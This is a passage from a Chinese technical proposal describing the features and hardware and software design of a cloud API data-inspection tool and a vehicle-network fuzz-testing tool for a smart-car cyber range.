据API的风险等级进行排序，还详细展示了每个API所属的业务应用和所在的主机信息。通过这种方式，工具为用户提供了一个全面的视图，使他们能够了解每个API的运行环境，并结合风险等级进行有效的风险评估和管理。这样的设计旨在协助用户在保护系统安全的同时，也能够保持业务的连续性和效率。</li><li>云端数据检查工具内置了一个全面的敏感数据识别规则库，它能够自动对流量日志进行深度分析，识别出敏感信息。这些规则库覆盖了各种常见的敏感数据类型，如个人身份信息、信用卡号码、密码等。一旦识别出敏感数据，工具会立即对这些信息进行标记（数据打标），确保用户可以迅速地识别并采取适当措施来保护这些信息。这个功能的实施对于遵守数据保护法规、防止数据泄露具有重要意义，帮助用户在数据处理和传输过程中保持高度的警觉和安全性。</li><li>云端数据检查工具的设计理念是全面性与灵活性的结合，它支持对各种数据格式进行敏感数据的识别。无论是结构化数据（如数据库表格）、半结构化数据（如JSON或XML文件），还是非结构化数据（如电子邮件和文本文件），工具都能够准确地识别出敏感信息。这种全方位的数据支持确保了无论数据以何种形式存储或传输，都能够得到有效的监控和保护，大幅降低了数据泄露的风险，并提升了企业数据管理的整体安全性。</li><li>云端数据检查工具具备强大的文件内容识别能力，可以处理通过API传输的多种类型的文件进行识别，对于办公环境中常见的文档格式，如Word（doc/docx）、Excel（xls/xlsx）、PowerPoint（ppt/pptx）、PDF以及WPS文档，工具都能够无缝识别并检查其中的内容。此外，它也支持文本类文档，包括txt、csv和rtf文件，确保文本信息的安全。对于其他格式如odt、odp、ofd、dps等，以及图像文件如JPG、JPEG、PNG、BMP、TIFF，工具同样提供支持。此外，对于压缩文件，如RAR、ZIP、7Z、BZ2、TAR、GZIP等，工具可以进行深入检查，确保压缩包内的文件内容也不会遗漏敏感数据的识别。这种全面的文件支持确保了企业在使用API进行数据传输时，各类文件都能得到有效的监控与保护。</li><li>云端数据检查工具提供了先进的图片内容识别功能，能够处理通过API接口传输的各种图片文件。支持的图片格式覆盖了市场上的主流及特定需求，包括但不限于webp、bmp、pcx、tif、gif、jpeg、tga、psd、png、ico、dib、ras、jp2、exr、dxf、pbm、pgm、ppm等。无论图片文件采用何种格式，本工具都能够识别其中的内容，从而有效地对图像中可能包含的敏感信息进行检测与管理，确保数据传输的安全性。这项功能对于图像密集型的应用场景尤为关键，能够大幅提升数据安全管理的广度和深度。</li><li>云端数据检查工具特别注重个人和商业信息的安全，因此内置了强大的敏感信息识别规则。支持内置个人信息（包含电话号码、身份证号、银行卡号信息、VIN码）、商业敏感信息（如合同、交易信息等）、金融信息、企业信息等多种敏感信息识别规则。为了适应不断变化的信息安全需求，敏感数据特征库支持在线升级和更新，确保能够持续对抗新出现的安全威胁，保障用户数据的绝对安全。</li><li>云端数据检查工具采用了多元化的技术手段，以确保对敏感数据的准确识别和归类。通过内置的规则，工具能够运用关键字识别、正则表达式、文件指纹匹配以及语义分析等先进技术，全面识别敏感数据。这些技术不仅能够确定数据的敏感性所属类型，还能评估敏感数据的安全等级以及统计敏感数据量。更为重要的是，这项技术不仅适用于结构化数据，对半结构化以及非结构化数据同样有效。无论数据以何种形式存在，此工具都能够提供全面的数据保护，确保敏感信息不被泄露。</li><li>为了提供更加灵活和个性化的数据安全解决方案，云端数据检查工具特别设计了自定义敏感信息检测功能，用户可以根据自己的特定需求，通过定义关键字、编写正则表达式等方式，创建符合自己业务特点的敏感信息检测规则。这种自定义能力极大地提升了工具的适用性和灵活性，使其能够适应各种不同的数据保护场景，确保敏感信息始终得到有效的监控和保护。</li><li>云端数据检查工具具备强大的展示功能，能够以API为维度清晰地展示相关的事件信息。这包括事件本身的详细情况、事件等级，以及与事件相关联的具体API。通过这种方式，用户可以快速了解每个API的安全状况，包括哪些API可能遭受攻击或者是敏感数据泄露的风险点。这样的展示机制不仅使得安全事件的监控更加直观，而且大大提升了安全事件处理的效率和准确性。</li><li>云端数据检查工具在安全事件管理方面提供了一项独特的视角，即允许用户从攻击者的维度来展示和审查安全事件。工具能够将事件、事件等级以及API与潜在的攻击者或攻击源关联起来。通过这种方法，安全团队可以更直观地识别和分析攻击者的行为模式，理解哪些API更容易成为攻击目标，从而采取更有针对性的防御措施。这样的功能不仅有助于快速响应安全事件，还能够帮助提升整体的安全防护能力。</li><li>云端数据检查工具在其威胁事件列表中提供了一个全面的视图，详尽地展示了与安全威胁相关的各种关键信息。用户可以看到每个事件名称、事件等级、主机、状态、攻击路径、攻击结果、攻击源、首次发现时间、最后发现时间、持续时间、业务系统、处置状态。为了便于跟踪和管理，工具还记录了事件首次被发现的时间、最后一次被观察到的时间以及事件的持续时间。同时，工具将事件与受影响的业务系统关联起来，并显示了目前的处置状态。这些细节的展示确保了安全团队可以获得足够的信息来进行有效的事件响应和后续的风险管理。</li><li>云端数据检查工具具备高级的日志查看功能，使用户能够在事件列表中直接访问和审查原始告警日志，告警日志包括告警发生时间、危害等级、受害者、攻击者、攻击结果、来源区域、威胁分类、威胁名称、HTTP请求路径、HTTP状态码、应用、威胁编号。每条告警日志都详细记录了关键的安全事件信息，包括告警的发生时间，以便于追踪事件的具体时点。日志中还包含了危害等级，这有助于用户评估事件的严重性。受害者的身份、攻击者的信息和攻击结果的详情同样被包含在内，为用户提供了事件的全面概览。来源区域的数据帮助用户理解攻击的地理来源，而威胁分类和威胁名称则提供了对攻击性质的深入理解。此外，HTTP请求路径和HTTP状态码为技术团队提供了网络层面的详细数据。应用名称确保了告警与特定的软件或服务关联，而威胁编号则允许用户快速索引和参考特定的安全威胁。这些日志数据的综合提供了一个全局视图，确保了安全团队能够准确快速地响应和处理安全事件。</li><li>云端数据检查工具提供了灵活的时间筛选功能，以满足不同用户对威胁事件分析时间范围的需求。使用这个功能，用户可以选择在预设的时间段内查看威胁事件，包括最近1小时、最近24小时、最近7天及最近30天内的安全事件。这样的设计使得安全团队能够快速聚焦于短期内的安全动态，或者拓展视野，审视更长时间范围内的安全趋势。此外，该工具还提供了自定义时间范围的选项，允许用户根据特定的需求，设定任何时间段来进行威胁事件的分析，从而提供了极高的灵活性和定制性。这种时间筛选机制极大地增强了安全团队在不同时间尺度上进行数据分析和事件响应的能力。</li><li>为云端数据检查工具提供了3年的软件license，并确保数据库可以确保3年内用户将享受到软件本身以及其背后数据库的免费升级服务。在这三年期间，用户都不需要支付额外费用即可获得这些升级。这项服务保证了用户能够始终使用最先进的工具来保护其数据安全，同时也为用户在财务预算上提供了可预期性和安心。</li></ol><h4 id="技术实现内容-50"><a href="#技术实现内容-50" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-10"><a href="#硬件方案-10" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>确保云端数据检查工具能够处理高达4Gbps的网络吞吐量，并且能够承担密集的数据处理任务，采用以下硬件配置：</p><p>高性能网络接口卡（NIC）：</p><p>工具将配备多个高性能10Gbps以太网端口的NIC，以支持冗余和负载均衡。NIC将支持高级网络特性，如硬件级别的流量分割和过滤，以减轻CPU的负担并提高数据包处理效率。</p><p>多核处理器：</p><p>核心服务器将配备至少两个多核处理器，每个处理器至少16核心，以确保足够的并行处理能力。这些处理器将具备高频率和大缓存，以优化运行复杂的数据处理算法和机器学习模型。</p><p>大容量内存：</p><p>64GB的高速RAM将被用来存储正在处理的数据和临时分析结果。这将确保即使在高负载情况下，数据检查工具也能保持响应迅速。</p><p>高速存储解决方案：</p><p>采用企业级SSD阵列，配合NVMe接口，提供极速的读写能力。10TB的存储空间不仅能够存放大量日志数据，还能容纳机器学习模型和临时分析文件。</p><p>硬件级RAID：</p><p>为了数据的安全性和持久性，存储将采用硬件级RAID配置。这不仅提供了数据冗余，还能提高读写性能。RAID的级别将根据实际需求选择，以平衡性能和数据保护。</p><p>可扩展性与冗余性：</p><p>服务器将设计为可扩展的架构，以便未来可以增加更多的处理能力和存储空间。此外，关键组件将采用冗余设计，如双电源和热插拔硬盘，确保系统的高可用性。</p><p>监控与管理：</p><p>服务器将包含集成的硬件监控系统，能够实时监控硬件状态并提供远程管理功能。这将极大地简化维护工作，并允许快速响应任何硬件故障。</p><h5 id="软件方案-12"><a href="#软件方案-12" class="headerlink" title="软件方案"></a>软件方案</h5><p>操作系统选择与优化：</p><p>采用专门为服务器优化的版本的Linux操作系统，CentOS或Ubuntu Server。系统进行精细调整，包括内核参数的优化、网络栈的调整以及安全性的加固，以确保能够处理高速网络流量并抵御各种网络攻击。</p><p>数据处理引擎的部署：</p><p>数据处理引擎是整个工具的核心，负责处理所有进出的数据流。Apache Kafka将作为消息队列系统，以确保高吞吐量的数据能够被有效地收集和传输。Apache Flink或Spark Streaming将用于实时数据流处理，能够快速执行复杂的数据转换、聚合和分析。</p><p>API管理平台的集成：</p><p>API管理平台是管理和监控API资产的关键。它提供API网关功能，监控API流量，并收集API使用情况的统计数据。此外，该平台还支持API的版本控制、权限管理、流量限制和API文档自动生成。</p><p>数据库系统的配置：</p><p>数据库系统负责存储和查询API元数据、敏感数据识别结果、事件日志等信息。将使用具有高事务处理能力的PostgreSQL数据库，同时部署NoSQL数据库如MongoDB，以支持大数据量和高速读写操作。</p><p>机器学习与模式识别的应用：</p><p>机器学习框架用于发展和部署敏感数据和威胁模式识别算法。这些算法将基于历史数据训练，以提高对新出现的威胁和敏感数据模式的识别能力。</p><p>安全组件的整合：</p><p>安全组件包括WAF和IDS，它们将作为防御的第一道屏障，保护系统免受攻击和未授权访问。WAF过滤恶意流量，而IDS监控异常行为，实时提醒系统管理员潜在的威胁。</p><p>用户界面和报告工具：</p><p>用户界面（UI）将是直观和易于使用的，允许用户轻松配置检查规则、查看实时数据流和分析结果。此外，报告工具提供丰富的可视化选项，包括图表和仪表板，以帮助用户理解数据和发现趋势。</p><h5 id="工具功能-12"><a href="#工具功能-12" class="headerlink" title="工具功能"></a>工具功能</h5><p>系统内置API识别规则，支持通过自动方式发现API资产；支持自动识别Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC类型API；支持对识别API自动聚类汇聚。</p><p>系统将集成先进的API自动识别技术，通过内置的识别规则库，能够实现对网络中各种类型API的智能发现。这些API包括但不限于基于HTTP/HTTPS协议的Restful API，用于实现灵活的数据查询的GraphQL API，实现实时通讯功能的websocket API，物联网领域中常用的轻量级消息传输协议MQTT，高性能的远程过程调用RPC框架gRPC，以及基于JSON和XML的远程过程调用协议JSON-RPC和XML-RPC。这些识别规则不仅能够检测API的存在，还能对API进行分类和汇总，从而为管理员提供清晰的API资产视图。</p><p>系统支持以列表形式展示API、API所属应用、API类型等多维信息，支持以主机以及业务应用两种视角查看API资产信息。</p><p>系统提供了一个用户友好的界面，通过列表的形式，将API相关的多维信息一目了然地展示出来。管理员可以看到每个API的详细信息，包括它所属的应用程序、API类型等。此外，系统还支持两种不同的视角查看API资产：一是从主机的角度，即可以查看某个主机上的所有API；二是从业务应用的角度，即可以查看某个业务应用包含的所有API。这种多维度视图使得管理员能够更容易地理解和管理API资产。</p><p>系统内置Restful、GraphQL、websocket、MQTT、gRPC、JSON-RPC、XML-RPC类型API识别规则，支持通过升级规则库方式更新API识别规则。</p><p>系统的API识别能力建立在一套全面的规则库之上，这些规则库覆盖了当前市场上主流的API类型。随着技术的发展，新的API类型可能会出现，或者现有API的特征可能会发生变化。因此，系统支持通过规则库的升级来不断更新和增强API识别规则，确保系统的识别能力与时俱进。</p><p>系统支持通过自定义方式设置API识别规则，支持基于字符串匹配以及正则表达式匹配API自定义识别规则。</p><p>除了系统内置的API识别规则，系统还提供了强大的自定义规则设置功能。用户可以根据自己的需要，通过字符串匹配或者更为复杂的正则表达式，来创建专属的API识别规则。这为那些具有特殊API设计的环境提供了便利，使得系统能够灵活适应各种不同的应用场景。</p><p>系统以列表形式分类展示按照API风险等级进行展示，展示API所属业务应用、所在主机等信息。</p><p>安全性是API管理中的重要方面，系统将对API进行风险评估，并按照风险等级进行分类展示。这个列表不仅显示了API的风险等级，还包括了API所属的业务应用和它所在的主机等关键信息。这样的设计使得管理员能够迅速识别出高风险的API，并采取相应的安全措施。</p><p>系统内置敏感数据识别规则库，支持对流量日志进行敏感数据识别、数据打标。</p><p>系统中集成了一套敏感数据识别规则库，这些规则能够在网络流量日志中自动识别出敏感信息，并对这些数据进行标记。这一功能对于遵守数据保护法规、防止数据泄露等方面至关重要。通过这种方式，系统能够帮助企业更好地管理和保护其关键数据资产。</p><p>支持结构化、半结构化以及非结构化数据进行敏感数据识别。</p><p>系统的敏感数据识别能力不限于任何特定格式的数据。无论是结构化数据（如数据库中的表格数据）、半结构化数据（如JSON或XML文件），还是非结构化数据（如文本文件或电子邮件），系统都能够有效地识别出其中的敏感信息。这种全面的识别能力确保了系统能够适应多样化的数据环境。</p><p>支持API传输的多种类型文件内容识别，支持办公类文档（doc/docx、xls/xlsx、ppt/pptx、pdf、wps）、支持文本类文档（txt、csv、rtf），其他类（odt、odp、ofd、dps等）、图片类（JPG、JPEG、PNG、BMP、TIFF）、压缩类（RAR、ZIP、7Z、BZ2、TAR、GZIP）等。</p><p>系统支持对通过API传输的各种文件内容进行识别，这包括了常用的办公文档格式（如Word、Excel、PowerPoint、PDF等），文本文件（如TXT、CSV、RTF等），以及其他文档格式（如OpenDocument格式和中国的OFD格式）。此外，系统还能识别图片文件（如JPG、PNG等）和各种常见的压缩文件格式。这种广泛的文件内容识别能力，使得系统能够在文件传输过程中有效地监控和保护敏感信息。</p><p>支持对通过API接口传输的图片中的内容进行识别。图片类型包括但不限于webp、bmp、pcx、tif、gif、jpeg、tga、psd、png、ico、dib、ras、jp2、exr、dxf、pbm、pgm、ppm等类型。</p><p>系统不仅能够识别标准的图片文件格式，还能够处理一系列专业或较少见的格式，如webp、pcx、tiff、gif、jpeg、tga、psd等。无论图片信息以何种形式通过API传输，系统都有能力进行内容识别，确保敏感图像数据不被未授权访问或泄露。</p><p>支持内置个人信息（包含不限于电话号码、身份证号、银行卡号信息、VIN码）、商业敏感信息（如合同、交易信息等）、金融信息、企业信息等多种敏感信息识别规则。敏感数据特征库支持在线升级和更新。</p><p>系统内置了强大的个人和商业敏感信息识别功能，能够自动检测包括电话号码、身份证号、银行卡信息、车辆识别号码（VIN码）在内的各种个人信息，以及合同、交易记录等商业敏感信息，甚至金融和企业相关数据。这些敏感数据的识别规则不是静态的，系统支持在线更新特征库，以适应不断变化的数据保护要求。</p><p>根据内置规则通过关键字识别、正则表达式、文件指纹以及语义分析等多种技术识别敏感数据，包括敏感数据所属类型、敏感数据等级、敏感数据数据量等，支持对结构化、半结构化、非结构化数据识别</p><p>系统采用多种技术手段对敏感数据进行识别，这包括基于关键字的搜索、正则表达式的模式匹配、文件指纹技术以及更为高级的语义分析技术。这些技术不仅能够识别出敏感数据，还能够确定数据的类别、评估数据的敏感程度和量化数据量。这些功能对于结构化、半结构化和非结构化数据均有效，确保了系统的广泛适用性。</p><p>支持自定义敏感信息检测功能，包括但不限于关键字、正则表达式等方式。</p><p>除了内置的敏感信息检测规则，系统还提供了高度的自定义能力。用户可以根据自己的业务需求和数据保护政策，自定义敏感信息检测规则，包括设定特定的关键字和构建复杂的正则表达式。这种灵活性使得系统能够适应不同行业和不同规模企业的需求。</p><p>支持以API维度展示事件、事件等级、API。</p><p>系统能够以API为维度，将与之相关的事件及其等级一并展示。管理员可以快速地查看到任何API相关的安全事件，以及这些事件的严重程度，从而针对性地采取响应措施。</p><p>支持以攻击者维度展示事件、事件等级、API</p><p>从攻击者的角度来看，系统可以展示与特定攻击者相关联的所有事件、这些事件的等级以及受影响的API。这有助于安全团队追踪和分析攻击者的行为模式，以及评估潜在的安全风险。</p><p>威胁事件列表中支持展示事件名称、事件等级、主机、状态、攻击路径、攻击结果、攻击源、首次发现时间、最后发现时间、持续时间、业务系统、处置状态。</p><p>在威胁事件列表中，系统提供了详尽的事件信息展示，包括事件的名称、等级、受影响的主机、当前状态、攻击路径、攻击结果、攻击源的信息、首次发现时间、最后发现时间、事件的持续时间、相关的业务系统以及事件的处置状态。这些信息的全面展示有助于安全团队迅速理解事件的全貌，并采取相应的应对措施。</p><p>支持在事件列表中查看原始告警日志，告警日志包括告警发生时间、危害等级、受害者、攻击者、攻击结果、来源区域、威胁分类、威胁名称、HTTP请求路径、HTTP状态码、应用、威胁编号。</p><p>系统允许用户在事件列表中直接查看与事件相关的原始告警日志。这些日志包含了告警的详细信息，如告警发生的时间、危害等级、受害者和攻击者的信息、攻击结果、来源区域、威胁的分类和名称、HTTP请求的具体路径和状态码、相关的应用程序以及威胁的唯一编号。这样的详细信息有助于深入分析和响应安全事件。</p><p>支持按照（最近1小时、最近24小时、最近7天、最近30天、自定义）展示威胁事件分析。</p><p>系统提供了灵活的时间选择工具，用户可以根据需要选择不同的时间范围（如最近1小时、24小时、7天、30天）或自定义时间段来分析威胁事件。这样的时间筛选功能使得用户能够根据自己的需求快速地获取到相关时间段内的安全事件分析，从而更有效地进行安全监控和风险评估。</p><h1 id="智能汽车网络靶场工具库-系统安全测试工具"><a href="#智能汽车网络靶场工具库-系统安全测试工具" class="headerlink" title="智能汽车网络靶场工具库-系统安全测试工具"></a>智能汽车网络靶场工具库-系统安全测试工具</h1><h2 id="技术路线-8"><a href="#技术路线-8" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="模糊测试工具"><a href="#模糊测试工具" class="headerlink" title="模糊测试工具"></a>模糊测试工具</h3><h4 id="功能实施方案-58"><a href="#功能实施方案-58" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>该产品信息如下：</p><p>品牌：国利</p><p>型号：GLFUZZing</p><p>参数信息如下：</p><ol><li>支持车载以太网HTTP、TCP、UDP、some/ip等协议模糊测试；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/803fc93b29954b5d30065f4f72b73e90.png"></p><p>HTTP模糊测试截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3758512edcefdd7f3efcfa2270835266.png"></p><p>TCP模糊测试截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0fbacfb67dc150fdb64ff7420d31380a.png"></p><p>UDP模糊测试截图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/030938c0faa9491bb16d6c3d3ff80450.png"></p><p>SOME/IP模糊测试截图</p><ol><li>具备WIFI通信测试能力，专门设计用于执行网络模糊测试。它能够模拟各种网络状态，检测WIFI通信在不稳定环境下的性能表现，确保网络设备的可靠性；</li><li>提供全面的支持蓝牙（BT/BLE）模块的协议层模糊测试功能。检测协议栈中的漏洞和异常，确保蓝牙模块在复杂的通信场景下能够稳定运行，提升设备的安全性和可靠性；</li><li>支持CAN/CANFD总线传输的模糊测试，能够对车载网络进行全面的安全性评估，模拟各种异常数据包，检验总线协议的健壮性；</li><li>支持USB通信模糊测试，通过工具对USB接口进行硬件插接，对其USB端口发送模糊测试报文，可有效发现USB通信中的异常行为，增强系统对潜在威胁的防护能力；</li><li>支持配备适配协议所需的可移动的硬件接口设备，工具配置了多种可移动的便携式接口设备，可应用于CAN、CANFD、以太网、USB、蓝牙、WiFi等多种接口类型的连接，适配多种协议，确保广泛的兼容性与灵活性，适用于多样化的测试环境；</li><li>所有测试均可通过界面进行灵活配置，提升操作便捷性与测试效率，具备直观、易用的前台操作界面，用户可以通过该界面进行所有测试的配置和执行，有助于提高测试效率和用户友好性。</li><li>界面操作直观简单，实现简洁而高效的操作体验，满足易用性标准，支持测试功能一目了然，操作简单易懂，确保用户能够快速上手，方便用户进行高效的测试。</li><li>提供详细测试记录功能，支持测试过程的完整文档化、结构化，对后续的查询、检查、校验等工作提供基础材料支持，以确保透明度和便于追溯；</li><li>支持捕捉设计逻辑缺陷，可对设备存在的设备设计逻辑缺陷错误进行识别，确保对被测试设备的准确性分析，提高发现潜在问题的能力，优化测试效率；</li><li>支持通信协议在模糊测试中竞态条件问题的发现与处理，在模糊测试过程中，工具能够检测和处理由通信协议产生的竞态条件问题，竞态条件是指多个线程或进程同时访问同一资源时可能出现的不确定行为，通过模糊测试工具有助于发现这些问题，确保测试过程中的稳定性和准确性，提升设备的可靠性；</li><li>本工具专门支持对被测试协议栈模组层进行深入分析，能够对被测设备的协议栈模组层进行深入的模糊测试，以确保各个模组层的功能和性能达到预期要求，这有助于发现潜在的问题并提高系统的稳定性和可靠性，能够有效地执行测试任务，确保协议栈的稳定性和安全性；</li><li>支持有状态转换协议，分析和衡量协议中各个状态的覆盖情况，确保在测试和验证过程中涵盖了所有可能的状态转换路径，能够精确计算状态覆盖率，以确保协议测试的完整性和准确性，提升协议的可靠性评估；</li><li>支持内存越界读导致的内存泄露模糊测试，能够有效识别和定位潜在的内存安全问题，通过模拟异常输入和操作，工具能够检测出内存越界读导致的内存泄露问题，从而提高系统的安全性和稳定性；</li><li>支持堆空间双重释放模糊测试，堆空间双重释放是一种常见的内存管理问题，模糊测试工具能够检测并报告这种问题，有效检测和预防潜在的内存释放漏洞；</li><li>支持堆空间释放后重引用模糊测试，能够识别释放后重新引用内存的缺陷，具备检测堆空间释放后重引用问题的能力，这种问题可能导致内存泄漏或程序崩溃。通过模拟异常输入和操作，工具能够检测出此类问题，从而提高系统的安全性和稳定性。</li><li>支持会话错误模糊测试，模糊测试工具能够进行会话错误的测试，精准地揭示通信缺陷，确保系统的健壮性。测试系统在检测处理会话时的行为，确保其在面对异常或错误时能够正确处理并保持稳定性。</li><li>支持协议栈处理会话错误模糊测试，通过模拟协议栈会话错误等各种异常情况，工具能够检测协议栈在处理会话错误时的行为，确保协议有足够的健壮性，对抗异常会话数据针对协议栈的模糊测试，特别是会话错误的处理。</li><li>支持协议栈处理不当导致内存损坏模糊测试，为了全面评估协议栈的性能和安全性，模糊测试工具能够对其内存管理进行深入的测试。这包括检测不当的内存释放、内存越界等问题，以确保协议栈能够正确、安全地管理内存；</li><li>支持点击事件、滑动事件、缩放事件、轨迹球事件、系统按键事件、键盘唤出隐藏事件等测试，全面支持Android monkey测试，覆盖点击事件、滑动事件、缩放事件、轨迹球事件、系统按键事件以及键盘唤出隐藏事件等多种交互测试。模拟用户随机操作，以此来检测Android应用程序的稳定性和错误处理能力。提供一套完整的测试工程，其中包括详尽的测试代码和清晰的操作说明文档。这些资源可以帮助开发者和测试工程师简化测试流程，提高测试效率，确保应用在各种意外和极端操作下的表现。通过这些工具和文档，用户可以轻松定制测试脚本，适应不同的测试场景，从而全面提升应用的质量和用户体验。此外，的工具还能够帮助用户快速定位和分析在测试过程中出现的问题，有效地缩短从发现问题到解决问题的周期，为Android应用的稳定性和可靠性提供有力保障；</li><li>提供软件license和数据库升级服务，这将有助于用户保持系统的最新状态并确保其安全性</li></ol><h4 id="技术实现内容-51"><a href="#技术实现内容-51" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-11"><a href="#硬件方案-11" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>高性能网络接口卡：</p><p>选择具备高性能网络吞吐能力的网络接口卡，例如支持千兆以太网（Gigabit Ethernet）或更高速率的网卡。</p><p>确保网络接口卡具备低延迟和高带宽的特性，以支持车载网络安全测试工具的高效运行。</p><p>适配硬件接口设备：</p><p>设计适配硬件接口设备，包括WIFI、蓝牙（BT/BLE）、CAN/CANFD总线和USB等通信协议。</p><p>确保适配硬件接口设备与被测车辆的接口兼容，并能够稳定地进行通信。</p><p>硬件接口设备连接方式：</p><p>为适配硬件接口设备提供合适的连接方式，例如USB接口、以太网接口、CAN/CANFD总线接口等。</p><p>确保连接方式简便可靠，方便用户进行硬件设备的接入和拆卸。</p><p>可移动的硬件接口设备：</p><p>设计可移动的硬件接口设备，便于用户在不同车辆之间灵活使用。</p><p>确保硬件接口设备具备良好的移动性和便携性，方便用户进行测试工作。</p><p>硬件接口设备的稳定性和可靠性：</p><p>确保硬件接口设备具备稳定性和可靠性，能够在长时间运行和高负载条件下保持正常工作。</p><p>进行充分的测试和验证，确保硬件接口设备能够正常工作并与车载网络安全测试工具配合良好。</p><h5 id="软件方案-13"><a href="#软件方案-13" class="headerlink" title="软件方案"></a>软件方案</h5><p>分层架构：软件采用分层架构设计，主要分为以下几层：</p><p>用户界面层（UI层）：提供操作界面，用户通过这个层进行交互。</p><p>业务逻辑层：处理模糊测试的核心逻辑，如测试用例生成、执行测试、监控等。</p><p>数据访问层：管理测试数据的存储，记录和查询测试结果。</p><p>硬件抽象层：与各种硬件接口设备通信，将设备特定的信息转换为软件可以操作的数据。</p><p>模块化设计：软件功能按模块划分，每个模块负责一组功能，便于管理和扩展。</p><p>插件化测试协议：针对不同的协议（如HTTP、TCP、UDP、some/ip、CAN/CANFD等），采用插件化设计，每个协议对应一个插件模块，便于未来添加新的协议支持。</p><p>服务化组件：将一些通用功能（如日志服务、报告服务等）设计为独立的服务组件，以服务的形式运行，提高系统的灵活性和可维护性。</p><p>用户界面模块：提供直观的操作界面，支持配置测试参数，展示实时测试状态和结果，提供测试历史记录和查询功能。</p><p>测试用例生成器模块：根据不同协议的规范生成模糊测试用例，支持自定义测试用例的生成规则，提供用例编辑器供高级用户手动编写或修改测试用例。</p><p>测试执行器模块：执行生成的测试用例，控制测试流程，如启动、暂停、停止等，与硬件接口设备交互，发送测试数据包。</p><p>硬件接口适配器模块：与可移动的硬件接口设备通信，为不同的通信协议提供统一的数据接口，支持热插拔和自动识别硬件设备。</p><p>测试监控模块：实时监控测试执行状态，捕获和记录异常事件和系统崩溃信息，支持实时日志记录和查看。</p><p>数据分析与报告模块：分析测试结果数据，计算协议状态覆盖率，生成详细的测试报告，包括潜在的安全问题和推荐的改进措施。</p><p>安全性分析模块：分析测试过程中发现的安全漏洞，提供漏洞等级评估，给出修复建议和风险评估报告。</p><p>配置管理模块：管理测试配置文件，提供配置文件的导入导出功能，支持配置的版本控制和历史比较。</p><p>日志服务模块：记录所有测试活动的详细日志，支持日志级别和格式的自定义，提供日志搜索和过滤功能。</p><p>Android Monkey测试模块：实现Android Monkey测试功能，支持多种事件的模拟，如点击、滑动、缩放等，提供测试工程、代码及说明文档。</p><h5 id="工具功能-13"><a href="#工具功能-13" class="headerlink" title="工具功能"></a>工具功能</h5><p>车载以太网协议模糊测试：工具支持对车载以太网中常用的HTTP、TCP、UDP、some/ip等协议进行模糊测试。这包括对协议字段的随机化、异常值注入、边界条件探测等多种模糊测试技术，以发现协议实现中的潜在缺陷和漏洞。</p><p>WIFI通信网络模糊测试：工具提供对WIFI通信网络的模糊测试能力，能够对WIFI协议栈进行压力测试，包括对SSID、密码、加密方式等参数进行模糊化处理，以检测网络设备在异常输入下的稳定性和安全性。</p><p>蓝牙模块协议层模糊测试：工具支持对蓝牙（BT/BLE）模块的协议层进行模糊测试，这涵盖对蓝牙设备发现、配对、数据传输等过程中协议数据包的模糊化，旨在揭示协议栈中的漏洞。</p><p>CAN/CANFD总线协议模糊测试：工具支持对CAN和CANFD总线协议进行模糊测试，这对于汽车行业中的车辆网络安全至关重要。测试包括对消息ID、载荷、帧格式等的模糊化，以测试网络节点的异常处理能力。</p><p>USB协议模糊测试：工具提供对USB协议的模糊测试功能，通过修改USB数据包的各种参数，来测试USB主机控制器和设备的错误处理能力和安全性。</p><p>可移动硬件接口设备：工具支持适配多种通信协议所需的可移动硬件接口设备，以便于在不同的测试环境和场景下进行模糊测试。</p><p>前台操作界面：工具带有完整的前台操作界面，用户可以通过这个界面配置所有的测试参数，包括协议选择、测试用例生成、测试执行等。</p><p>易用性要求：测试软件设计注重用户体验，具有友好的用户界面和简单的操作流程，使得非专业人员也能快速上手进行测试。</p><p>测试过程记录及查询：工具支持对被测设备的测试过程进行详细记录，并提供查询功能，方便用户回溯和分析测试结果。</p><p>逻辑缺陷错误发现：工具支持在模糊测试中发现被测试设备设计的逻辑缺陷和错误，增强测试的深度和广度。</p><p>竞态条件问题：工具支持在模糊测试中识别通信协议可能产生的竞态条件问题，这对于多线程或多进程环境下的协议尤为重要。</p><p>协议栈模组层测试：工具支持对被测试协议栈的模组层进行模糊测试，以确保协议的各个模块都能正确处理异常输入。</p><p>状态转换覆盖率计算：工具支持对有状态转换协议的状态覆盖的覆盖率计算，帮助开发者了解测试的全面性。</p><p>内存越界读测试：工具支持模糊测试内存越界读操作导致的内存泄露问题，这是常见的安全问题之一。</p><p>堆空间双重释放测试：工具支持对堆空间进行双重释放模糊测试，以发现潜在的内存管理错误。</p><p>堆空间释放后重引用测试：工具支持模糊测试堆空间释放后重引用的场景，这些错误可能会导致程序崩溃或安全漏洞。</p><p>会话错误模糊测试：工具支持会话错误模糊测试，以检测协议在会话管理方面的健壮性。</p><p>协议处理会话错误测试：工具支持协议栈协议处理会话错误的模糊测试，确保协议能正确处理会话异常。</p><p>内存损坏模糊测试：工具支持协议栈处理不当导致的内存损坏模糊测试，帮助发现和修复协议栈的内存安全问题。</p><p>Android monkey测试：工具支持Android monkey测试，能够模拟用户操作，如点击、滑动、缩放等事件，以及系统按键和键盘事件等，提供完整的测试工程、代码及说明文档，帮助开发者进行全面的应用测试。</p><p>异常记录和查询：记录模糊测试过程中出现的异常情况，包括错误码、异常行为和异常数据，并提供查询功能，方便用户分析和排查问题。</p><p>自定义测试用例生成：提供灵活的测试用例生成工具，允许用户根据自身需求定制特定的模糊测试用例，以增加测试覆盖范围和深度。</p><p>模糊测试结果分析：对模糊测试结果进行自动化分析，提供统计数据和图表，帮助用户了解测试覆盖率、发现的错误类型和数量等信息。</p><p>漏洞报告生成：自动生成漏洞报告，包括发现的安全漏洞、错误详情、风险评估和建议修复措施，以便用户进行漏洞修复和安全加固。</p><h3 id="APP自动化检测工具"><a 